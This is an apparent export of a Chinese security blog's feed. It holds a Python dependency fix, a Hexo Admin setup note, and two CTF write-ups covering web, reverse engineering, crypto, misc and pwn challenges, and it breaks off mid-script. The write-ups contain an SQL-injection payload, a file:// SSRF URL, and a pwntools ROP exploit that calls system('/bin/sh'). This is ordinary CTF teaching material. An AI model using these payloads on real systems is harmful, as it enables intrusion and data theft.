<p>继续报错,这次就缺一个包了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># python bwm.py decode 1.png problem.png true.png</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"bwm.py"</span>, line 57, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import matplotlib.pyplot as plt</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/matplotlib/pyplot.py"</span>, line 115, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    _backend_mod, new_figure_manager, draw_if_interactive, _show = pylab_setup()</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/matplotlib/backends/__init__.py"</span>, line 63, <span class="keyword">in</span> pylab_setup</span><br><span class="line">    [backend_name], 0)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/matplotlib/backends/backend_tkagg.py"</span>, line 4, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from . import tkagg  <span class="comment"># Paint image to Tk photo blitter extension.</span></span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/matplotlib/backends/tkagg.py"</span>, line 5, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from six.moves import tkinter as Tk</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/six.py"</span>, line 203, <span class="keyword">in</span> load_module</span><br><span class="line">    mod = mod._resolve()</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/six.py"</span>, line 115, <span class="keyword">in</span> _resolve</span><br><span class="line">    <span class="built_in">return</span> _import_module(self.mod)</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/six.py"</span>, line 82, <span class="keyword">in</span> _import_module</span><br><span class="line">    __import__(name)</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/lib-tk/Tkinter.py"</span>, line 42, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    raise ImportError, str(msg) + <span class="string">', please install the python-tk package'</span></span><br><span class="line">ImportError: No module named _tkinter, please install the python-tk package</span><br></pre></td></tr></table></figure></p>
<p>先用工具找找这是什么包,安装后就可以运行程序了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># apt-file search python-tk</span></span><br><span class="line">python-tk: /usr/share/doc/python-tk/README.Debian</span><br><span class="line">python-tk: /usr/share/doc/python-tk/README.Tk</span><br><span class="line">python-tk: /usr/share/doc/python-tk/changelog.Debian.gz</span><br><span class="line">python-tk: /usr/share/doc/python-tk/copyright</span><br><span class="line">python-tk: /usr/share/lintian/overrides/python-tk</span><br><span class="line">python-tk-dbg: /usr/share/doc/python-tk-dbg</span><br><span class="line">python-tk-dbg: /usr/share/lintian/overrides/python-tk-dbg</span><br><span class="line">python-tksnack: /usr/share/doc/python-tksnack/README.Debian</span><br><span class="line">python-tksnack: /usr/share/doc/python-tksnack/README.gz</span><br><span class="line">python-tksnack: /usr/share/doc/python-tksnack/changelog.Debian.gz</span><br><span class="line">python-tksnack: /usr/share/doc/python-tksnack/copyright</span><br><span class="line">python-tktreectrl: /usr/share/doc/python-tktreectrl/README</span><br><span class="line">python-tktreectrl: /usr/share/doc/python-tktreectrl/changelog.Debian.gz</span><br><span class="line">python-tktreectrl: /usr/share/doc/python-tktreectrl/copyright</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/MultiListbox.html</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/ScrolledTreectrl.html</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/TkTreectrl.html</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/Treectrl.html</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/changelog.Debian.gz</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/copyright</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/demo/dirtree.py.gz</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/demo/fancy_multilistbox.py.gz</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/demo/folder.gif</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/demo/multilistbox.py</span><br><span class="line">python-tktreectrl-doc: /usr/share/doc/python-tktreectrl-doc/demo/openfolder.gif</span><br><span class="line">root@Damyayayayaya:~<span class="comment"># apt-get install python-tk</span></span><br><span class="line">root@Damyayayayaya:~<span class="comment"># python bwm.py decode 1.png problem.png true.png</span></span><br><span class="line">image&lt;1.png&gt; + image(encoded)&lt;problem.png&gt; -&gt; watermark&lt;true.png&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>cv2模板的依赖有点多,以后可以一次性安装好,省得麻烦<br>以下是所有要装的依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libsm6</span><br><span class="line">apt-get install libxrender1</span><br><span class="line">pip install matplotlib</span><br><span class="line">apt-get install python-tk</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 报错解决 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo Next 实现博客后台管理]]></title>
      <url>/%E6%90%AD%E5%BB%BA/ckwd5ws7w002id0uch4eptdh7/</url>
      <content type="html"><![CDATA[<h2 id="安装Hexo-Admin插件"><a href="#安装Hexo-Admin插件" class="headerlink" title="安装Hexo Admin插件"></a>安装Hexo Admin插件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br><span class="line">hexo server -d</span><br><span class="line">open http://localhost:4000/admin/</span><br></pre></td></tr></table></figure>
<h2 id="Hexo-Admin配置登陆账号和密码"><a href="#Hexo-Admin配置登陆账号和密码" class="headerlink" title="Hexo Admin配置登陆账号和密码"></a>Hexo Admin配置登陆账号和密码</h2><p>本地打开<code>open http://localhost:4000/admin/</code><br>ps:只能在本地进行后台管理,无法在自己的域名下进行后台管理<br>在<strong>Settings</strong>里设置登陆密码,并在<strong>Editor Settings</strong>里把行数和拼写检查勾上,再点击<strong>Setup authentification here</strong><br>在<strong>Authentification Setup</strong>里填写账号,密码和加密字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#hexo-admin authentification</span><br><span class="line">admin:</span><br><span class="line">  username:</span><br><span class="line">  password_hash:</span><br><span class="line">  secret:</span><br></pre></td></tr></table></figure></p>
<p>将这段内容复制到博客根目录下的<code>_config.yml</code>里<br>并执行三道命令重启服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo serber -d</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure></p>
<p>系统将会自动重定向到登陆页面</p>
]]></content>
      
        <categories>
            
            <category> 搭建 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2019techworld wp]]></title>
      <url>/ctf-writeup/ckwd5ws710019d0uc6ofvc52o/</url>
      <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-web1"><a href="#0x01-web1" class="headerlink" title="0x01 web1"></a>0x01 web1</h2><p>.DS_Store泄漏<br>能读到目录结构，发现其中有.git所以用.get泄漏工具<br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>直接查看git log 就能发现flag<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h2 id="0x02-web2"><a href="#0x02-web2" class="headerlink" title="0x02** web2**"></a><strong>0x02**</strong> web2**</h2><p>很清楚在gitlib中能够下载到题目的源代码<br><a href="http://39.106.184.130:8086/root/MyProject" target="_blank" rel="noopener">http://39.106.184.130:8086/root/MyProject</a><br><figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>发现curl_exec存在漏洞所以构造语句<br><a href="http://39.106.184.130:8085/index.php?url=file://39.106.184.130:8085/flag.txt&amp;pass=ctfun" target="_blank" rel="noopener">http://39.106.184.130:8085/index.php?url=file://39.106.184.130:8085/flag.txt&amp;pass=ctfun</a><br><figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h2 id="0x03-web3"><a href="#0x03-web3" class="headerlink" title="0x03 web3"></a><strong>0x03 web3</strong></h2><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>发现存在git目录，是Struts2的网站，使用漏洞测试工具进行扫描：<br><figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>发现存在代码执行漏洞，借助工具进行目录探测</p>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>发现根目录下存在flag.txt，但是没有读取的权限，反弹shell没有成功，最后测试通过可执行文件SUID提权<br>使用tac查看flag.txt<br><figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h2 id="0x04-web5"><a href="#0x04-web5" class="headerlink" title="0x04 web5"></a><strong>0x04 web5</strong></h2><p><strong>payload：</strong><br>很明显的sql注入，过滤了&lt;&gt;+like ,ascii 使用十六进制数 和regexp 替换：<br>payload：<br><a href="http://39.106.184.130:8082/index.php?id=2" target="_blank" rel="noopener">http://39.106.184.130:8082/index.php?id=2</a>^(hex(substr(database(),1,1)) regexp ‘^64$’)</p>
<p>exp:<br> <figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>flag：deb7cb73f0ea2b2af2d1e3715fd12044</p>
<h2 id="0x05-web6"><a href="#0x05-web6" class="headerlink" title="0x05 web6"></a><strong>0x05 web6</strong></h2><p>根据提示，修改请求头，添加Client-I:127.0.0.1,发送请求即获得flag。<br><figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="0x01-Crackme-Middle"><a href="#0x01-Crackme-Middle" class="headerlink" title="0x01 Crackme_Middle"></a>0x01 Crackme_Middle</h2><p>进入IDA<br><figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>分析代码 ，发现只有让v3等于1输入才正确<br>进入sub_401258<br><figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>判断输入，能得到有效得输入长度是16位，其他的就进行输入判断，不管，最后得flag一定满足这个判断，所以不用看懂<br>进入sub_4012A9<br><figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>进入两个函数，第一个函数是生成一个key<br>第二个是将key和我们得输入进行一顿操作<br>进入第二个函数<br><figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>发现只是将我们得输入和生成得index1,index2,index3进行了一个加减，所以这里直接动调<br><figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>断在这个，然后每次看dl寄存器的值就OK了<br>最后将得到的值加上下面这一顿数据<br><figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>就出来flag了<br> <figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="0x01-rsa"><a href="#0x01-rsa" class="headerlink" title="0x01 rsa"></a>0x01 rsa</h2><p>n= 703739435902178622788120837062252491867056043804038443493374414926110815100242619<br>e= 59159<br>c= 449590107303744450592771521828486744432324538211104865947743276969382998354463377<br>m=???</p>
<p>发现n分解出来三个素数，使用中国剩余定理解题，脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from sage.all import *</span><br><span class="line"></span><br><span class="line">n=703739435902178622788120837062252491867056043804038443493374414926110815100242619</span><br><span class="line">e=59159</span><br><span class="line">c=449590107303744450592771521828486744432324538211104865947743276969382998354463377</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 703739435902178622788120837062252491867056043804038443493374414926110815100242619</span><br><span class="line">a = 810971978554706690040814093</span><br><span class="line">b = 782758164865345954251810941</span><br><span class="line">c = 1108609086364627583447802163</span><br><span class="line">e = 59159</span><br><span class="line">phi = (a-1)*(b-1)*(c-1)</span><br><span class="line">ne = 0</span><br><span class="line">while phi % (e**(ne+1)) == 0:</span><br><span class="line">  ne += 1</span><br><span class="line">print &quot;ne = &quot;, ne</span><br><span class="line">d = long(1/Mod(e,phi/e**ne))</span><br><span class="line">print &quot;d = &quot;, d</span><br><span class="line"></span><br><span class="line">cipher = 449590107303744450592771521828486744432324538211104865947743276969382998354463377</span><br><span class="line">plain_pow_ene = pow(cipher,d*e**ne,n)</span><br><span class="line">print plain_pow_ene</span><br><span class="line">cases = []</span><br><span class="line">for p in [a,b,c]:</span><br><span class="line">  cases.append(Mod(plain_pow_ene%p,p).nth_root(e**ne,all=True))</span><br><span class="line">print &quot;Start solving&quot;</span><br><span class="line">for ar in map(long,Mod(plain_pow_ene%a,a).nth_root(e**ne,all=True)):</span><br><span class="line">  for br in map(long,Mod(plain_pow_ene%b,b).nth_root(e**ne,all=True)):</span><br><span class="line">    for cr in map(long,Mod(plain_pow_ene%c,c).nth_root(e**ne,all=True)):</span><br><span class="line">      x = crt([ar,br,cr],[a,b,c])</span><br><span class="line">      print hex(x)</span><br><span class="line">      s = hex(x)</span><br><span class="line">      if len(s)%2==1:</span><br><span class="line">        s = &quot;0&quot; + s</span><br><span class="line">      print s.decode(&quot;hex&quot;)</span><br></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  not execute Python code from this directory</span><br><span class="line">ne =  0</span><br><span class="line">d =  362843528015826034116250472435616782986296050195278657613571087702035376387404519</span><br><span class="line">706900059474687415234977372280974474387136281736704352050012391399307133</span><br><span class="line">Start solving</span><br><span class="line">sys:1: DeprecationWarning: use the method .hex instead</span><br><span class="line">See https://trac.sagemath.org/26756 for details.</span><br><span class="line">666c61677b3165323537623339613235633661376334643636653139377d</span><br><span class="line">flag&#123;1e257b39a25c6a7c4d66e197&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="0x02-Naruto"><a href="#0x02-Naruto" class="headerlink" title="0x02 Naruto"></a>0x02 <strong>Naruto</strong></h2><p>先stegdetect，<br><figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{jphid_is_good}</p>
<h2 id="0x03-Log-analysis"><a href="#0x03-Log-analysis" class="headerlink" title="0x03 Log analysis"></a>0x03 Log analysis</h2><p>分析日志文件：</p>
<figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>有目录扫描和sql盲注，通过grep语法获得sql注入日志<br><figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>分析sql注入语句可得到flag的ascii编码，统一进行转换即可获得flag<br><figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="0x05-FindMe"><a href="#0x05-FindMe" class="headerlink" title="0x05 FindMe"></a>0x05 FindMe</h2><p>下载文件之后file<br><figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>binwalk<br><figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>作为硬盘镜像写入U盘，得到9张二维码碎片，信息为：<br> Here is the AES key to decrypt our secret, please remember it carefully: “7h3_s3cR37_k3Y!!”<figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>一个txt文档，内容为：<br>I’ve decoded your audio message and decrypted your secret. I deleted it so that no one could know lol<br>根据这篇文章提取出wav文件：<br><a href="https://martinmelhus.com/squarectf-2017-writeup/" target="_blank" rel="noopener">https://martinmelhus.com/squarectf-2017-writeup/</a><br>修复wav文件：<br><figure class="image-box">
                <img src="./29.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>打开后发现是摩斯电码，解码后为：<brp>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 团队ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第十二届全国大学生信息安全竞赛线上赛wp]]></title>
      <url>/ctf-writeup/ckwd5wsav006pd0ucl77o9s5x/</url>
      <content type="html"><![CDATA[<h1 id="防灾科技学院G1nkGioy战队"><a href="#防灾科技学院G1nkGioy战队" class="headerlink" title="防灾科技学院G1nkGioy战队"></a>防灾科技学院G1nkGioy战队</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01  签到"></a>0x01  签到</h3><p>只要有三个人就可以出现flag<br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d}</p>
<h3 id="0x02-saleae"><a href="#0x02-saleae" class="headerlink" title="0x02  saleae"></a>0x02  saleae</h3><p>根据提示需要软件saleae logic 1.2.17<br>看到三道信号输入  用spi分析  调参数   读出flag<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./6.png" alt="图片](./3.png)![图片](./4.png)![图片](./5.png)![图片" title class>
                <p>图片](./3.png)![图片](./4.png)![图片](./5.png)![图片</p>
            </figure><br>flag{12071397-19d1-48e6-be8c-784b89a95e07}</p>
<h3 id="0x03-24c"><a href="#0x03-24c" class="headerlink" title="0x03  24c"></a>0x03  24c</h3><p>analyzers  12c 分析   用到12c总线通信<br><figure class="image-box">
                <img src="./10.png" alt="图片](./7.png)![图片](./8.png)![图片](./9.png)![图片" title class>
                <p>图片](./7.png)![图片](./8.png)![图片](./9.png)![图片</p>
            </figure><br>提取文字  flag{c46d9e10-e9b5-4d90-a883-41cf163bdf4e}<br>根据头尾的setup write to …和NAK结束符，进行拼接<br>头部的’ ‘ + 尾部的\t  从头跳过前九位（空格）开始写入，ac替换9e<br>flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e}</p>
<h3 id="0x04-usbasp"><a href="#0x04-usbasp" class="headerlink" title="0x04  usbasp"></a>0x04  usbasp</h3><p>看到三道通信  用spi 分析  调参数得到flag<br><figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<figure class="image-box">
                <img src="./14.png" alt="图片](./12.png)![图片](./13.png)![图片" title class>
                <p>图片](./12.png)![图片](./13.png)![图片</p>
            </figure>
<p>flag{85b084c6-42e6-495c-87b4-46dfb1df58a0}</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x01-your-pwn"><a href="#0x01-your-pwn" class="headerlink" title="0x01  your_pwn"></a>0x01  your_pwn</h3><p>利用read函数获取栈上libc_start地址，通过在线查询获取libc版本，下载对应版本libc库读取system函数偏移地址，再将该地址覆盖至栈上返回地址。<br>由于是64位，参数放在栈上，所以要先将bin/sh字符串地址写到栈上，再通过ROPgadget找到pop rdi的位置，先调用该处函数将sh字符串地址存入rdi，再调用system函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;)</span><br><span class="line">r = process(&apos;./pwn&apos;)</span><br><span class="line">libc = elf(&apos;./libc.so&apos;)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(&quot;abcdefg&quot;)</span><br><span class="line">array = [&apos;0&apos; for i in range(6)]</span><br><span class="line">n = 632</span><br><span class="line">i = 0</span><br><span class="line">while(i &lt; 6):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n + i))</span><br><span class="line">	r.recvuntil(&quot;now value(hex) &quot;)</span><br><span class="line">	tmp = r.recv(2).decode(&apos;utf-8&apos;)</span><br><span class="line">	tmp2[i] = tmp</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	r.sendline(str(int(tmp, 16)))</span><br><span class="line">	i += 1</span><br><span class="line">str1 = &quot;&quot;</span><br><span class="line">for i in range(6):</span><br><span class="line">	str1 += array[i]</span><br><span class="line">addr = int(str1, 16)</span><br><span class="line">libc_base = addr - addr2</span><br><span class="line">obj = LibcSearcher(&quot;__libc_start_main_ret&quot;, addr)</span><br><span class="line">addr2 = libc.symbol(b&quot;__libc_start_main_ret&quot;)</span><br><span class="line">sh_addr = libc.symbol(b&quot;str_bin_sh&quot;) + libc_base</span><br><span class="line">system_addr = libc.symbol(b&quot;system&quot;) + libc_base</span><br><span class="line">sh_addrstr = hex(sh_addr)</span><br><span class="line">system_addrstr = hex(system_addr)</span><br><span class="line">n = 344</span><br><span class="line">array = [&apos;0&apos; for i in range(6)]</span><br><span class="line">i = 0</span><br><span class="line">while(i &lt; 6):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n + i));</span><br><span class="line">	r.recvuntil(&quot;now value(hex) &quot;)</span><br><span class="line">	tmp = r.recv(2).decode(&apos;utf-8&apos;)</span><br><span class="line">	tmp2[i] = tmp</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	r.sendline(str(int(tmp, 16)))</span><br><span class="line">	i += 1</span><br><span class="line">str1 = &quot;&quot;</span><br><span class="line">for i in range(6):</span><br><span class="line">	str1 += array[i]</span><br><span class="line">return_addr = int(str1, 16)</span><br><span class="line">pop_addr = return_addr + 498</span><br><span class="line">str_pop_addr = hex(pop_addr)</span><br><span class="line">#pop rdi retn</span><br><span class="line">n = 344</span><br><span class="line">r.recvuntil(&quot;input index&quot;)</span><br><span class="line">r.sendline(str(n))</span><br><span class="line">r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">tmp = str_pop_addr[12] + str_pop_addr[13]</span><br><span class="line">r.sendline(str(int(tmp, 16)))</span><br><span class="line">r.recvuntil(&quot;input index&quot;)</span><br><span class="line">r.sendline(str(n+1))</span><br><span class="line">r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">tmp = str_pop_addr[10] + str_pop_addr[11]</span><br><span class="line">r.sendline(str(int(tmp, 16)))</span><br><span class="line">n = 352</span><br><span class="line">for i in range(8):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n + i + 1))</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	if(i &gt;= 5):</span><br><span class="line">		r.sendline(&quot;0&quot;)</span><br><span class="line">	else:</span><br><span class="line">		r.sendline(str(int(sh_addrstr[13-2*i-1] + sh_addrstr[14-2*i-1], 16)))</span><br><span class="line">n = 360</span><br><span class="line">for i in range(6):</span><br><span class="line">	r.recvuntil(&quot;input index&quot;)</span><br><span class="line">	r.sendline(str(n+i+1))</span><br><span class="line">	r.recvuntil(&quot;input new value&quot;)</span><br><span class="line">	print(system_addrstr)</span><br><span class="line">	r.sendline(str(int(system_addrstr[2*(6-i)] + system_addrstr[2*(6-i) + 1], 16)))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<p> flag{9e86b13d6003427e1e63938f740e4c28} </p>
<h3 id="0x02-baby-pwn"><a href="#0x02-baby-pwn" class="headerlink" title="0x02  baby_pwn"></a>0x02  baby_pwn</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">import socket</span><br><span class="line">import 